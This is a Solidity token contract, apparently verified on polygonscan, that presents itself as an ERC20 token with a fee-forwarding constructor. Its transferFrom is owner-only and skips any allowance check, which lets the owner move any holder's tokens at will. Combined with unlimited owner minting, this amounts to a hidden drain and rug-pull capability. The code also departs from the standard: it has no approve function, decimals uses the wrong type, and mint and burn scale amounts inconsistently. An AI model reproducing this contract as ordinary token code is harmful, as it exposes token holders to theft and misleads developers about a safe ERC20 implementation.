/**
 *Submitted for verification at polygonscan.com on 2023-03-08
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Mint(address indexed from, uint256 value);
}

pragma solidity 0.8.19;

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint256);
}

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode
        return msg.data;
    }
}

pragma solidity 0.8.19;

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    uint256 private _decimals;
    string private _name;
    string private _symbol;
    address private _owner;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Only owner can do this");
        _;
    }

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 initialBalance_,
        uint256 decimals_
    ) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = initialBalance_ * 10**decimals_;
        _balances[msg.sender] = _totalSupply;
        _decimals = decimals_;
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override onlyOwner returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }


    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");

        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function mint(uint256 amount) public onlyOwner returns (bool) {
        uint256 totalAmount = amount * 10**_decimals ;
        _totalSupply += totalAmount;
        _balances[_owner] += totalAmount;
        emit Transfer(address(0), _owner, totalAmount);
        return true;
    }

    function burn(uint256 amount) public onlyOwner returns (bool) {
        require(_balances[msg.sender] >= amount, "Amount exceeded");
        _totalSupply -= amount;
        _balances[msg.sender] -= amount;
        emit Burn(msg.sender, amount);
        return true;
    }
}

pragma solidity ^0.8.19;

contract MyToken is ERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 decimals_,
        uint256 initialBalance_,
        address payable feeReceiver_
    ) payable ERC20(name_, symbol_, initialBalance_, decimals_) {
        payable(feeReceiver_).transfer(msg.value);
    }
}